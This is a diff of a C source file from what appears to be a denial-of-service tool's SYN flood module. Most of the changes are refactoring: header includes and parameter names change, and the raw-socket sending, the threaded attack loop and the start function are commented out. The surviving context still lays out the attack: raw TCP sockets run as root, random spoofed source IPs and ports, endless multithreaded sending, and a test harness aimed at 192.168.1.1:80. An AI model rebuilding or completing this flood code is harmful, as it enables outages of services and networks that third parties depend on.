@@ -21,23 +21,9 @@
 #include <sys/types.h>
 #include <signal.h>
 
-#include "syn_flood_dos.h"
-#include "main.h"
-
-// from ../core/core_log.c
-extern size_t ShowMessage(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
-extern size_t InfoMessage(const char *fmt, ...);
-extern size_t DebugMessage(const char *fmtsring, ...);
-extern size_t ErrorMessage(const char *fmt, ...);
-
-extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
-
-extern void FreeSplitUrlBuff(pSplitUrlOutput p);
-extern size_t SplitUrl(const char *url, pSplitUrlOutput *output);
-extern void FreeRandomIPBuff(char *p);
-extern size_t GetRandomIP(char **output);
-extern size_t GetRandomPort(size_t *output);
-extern void SignalExit(int signo);
+#include "syn_flood.h"
+#include "../debug.h"
+#include "../main.h"
 
 //int attack(const struct AHTTP_INPUT *ainput)
 static int SendSYN(const pSYNStruct ss, const int debug_level)
@@ -45,6 +31,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     // start attack now
     // create a raw socke
     // the program must run as root
+    /*
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (socket_fd < 0)
     {
@@ -182,14 +169,13 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
             //break;
         }
         // Data send successfull
-        /*
         else
         {
-            debug(debug_level, 2, "Attack packet end successful");
+            //debug(debug_level, 2, "Attack packet end successful");
         }
-        */
     }
     close(socket_fd);
+    */
 
     return 0;
 }
@@ -207,12 +193,13 @@ static void FreeSYNStructBuff(pSYNStruct input)
     }
 }
 
-static int AttackThread(pInput input)
+static int AttackThread(pParameter input)
 {
     // now we start the syn flood attack
 
+    /*
     pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
-    pSplitUrlOutput split_result;
+    pSplitUrlRet split_result;
     int i;
 
     if (!SplitUrl(input->address, &split_result))
@@ -220,10 +207,10 @@ static int AttackThread(pInput input)
         ErrorMessage("AttackThread SplitUrl failed");
         return 1;
     }
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->protocol);
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->host);
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %d", split_result->port);
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->suffix);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->protocol);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->host);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %d", split_result->port);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->suffix);
     if (split_result->port == 0)
     {
         if (strlen(split_result->host) == 0)
@@ -255,11 +242,11 @@ static int AttackThread(pInput input)
     FreeSplitUrlBuff(split_result);
     syn_struct->each_ip_repeat = input->each_ip_repeat;
 
-    ShowMessage(VERBOSE, input->debug_level, "AttackThread start sending data...");
+    ShowMessage(VERBOSE, input->debug_mode, "AttackThread start sending data...");
     for (;;)
     {
         // here get the random ip address and port
-        if (input->random_sip_address == ENABLE_SIP)
+        if (input->random_source_ip_address == ENABLE_SIP)
         {
             if (!GetRandomIP(&(syn_struct->src_ip)))
             {
@@ -279,7 +266,7 @@ static int AttackThread(pInput input)
         // rport is random source port
         for (i = 0; i < input->each_ip_repeat; i++)
         {
-            if (SendSYN(syn_struct, input->debug_level))
+            if (SendSYN(syn_struct, input->debug_mode))
             {
                 ErrorMessage("AttackThread Attack failed");
                 //return 1;
@@ -288,19 +275,21 @@ static int AttackThread(pInput input)
         FreeRandomIPBuff(syn_struct->src_ip);
     }
     FreeSYNStructBuff(syn_struct);
+    */
     return 0;
 }
 
-int StartSYNFloodAttack(const pInput input)
+int StartSYNFloodAttack(const pParameter input)
 {
     // run function in thread
     // this attack type must run as root
 
+    /*
     pthread_t tid[input->max_thread];
     pthread_attr_t attr;
     int j, ret;
 
-    ShowMessage(VERBOSE, input->debug_level, "Enter StartSYNFloodAttack");
+    ShowMessage(VERBOSE, input->debug_mode, "Enter StartSYNFloodAttack");
     signal(SIGINT, SignalExit);
     // unlimit loop
     for (;;)
@@ -323,11 +312,11 @@ int StartSYNFloodAttack(const pInput input)
             // create thread
             ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
             //printf("j is: %d\n", j);
-            ShowMessage(DEBUG, input->debug_level, "tid: %ld", tid[j]);
+            ShowMessage(DEBUG, input->debug_mode, "tid: %ld", tid[j]);
             // here we make a map
             if (ret != 0)
             {
-                ShowMessage(DEBUG, input->debug_level, "ret: %d", ret);
+                ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
                 ErrorMessage("Create pthread failed");
                 return 1;
             }
@@ -340,14 +329,15 @@ int StartSYNFloodAttack(const pInput input)
             pthread_join(tid[j], NULL);
         }
     }
+    */
     return 0;
 }
 
-int StartSYNFloodTest(const pInput input)
+int StartSYNFloodTest(const pParameter input)
 {
     // run function in thread
     // this attack type must run as root
-    ShowMessage(VERBOSE, input->debug_level, "Enter StartSYNFloodTest");
+    InfoMessage("Enter StartSYNFloodTest");
     AttackThread(input);
     return 0;
 }
@@ -356,7 +346,7 @@ int StartSYNFloodTest(const pInput input)
 int main(void)
 {
     // for test
-    pInput p = (pInput)malloc(sizeof(Input));
+    pAllAttackParameter p = (pAllAttackParameter)malloc(sizeof(Input));
     p->random_sip_address = ENABLE_SIP;
     p->each_ip_repeat = 1024;
     strcpy(p->address, "192.168.1.1:80");
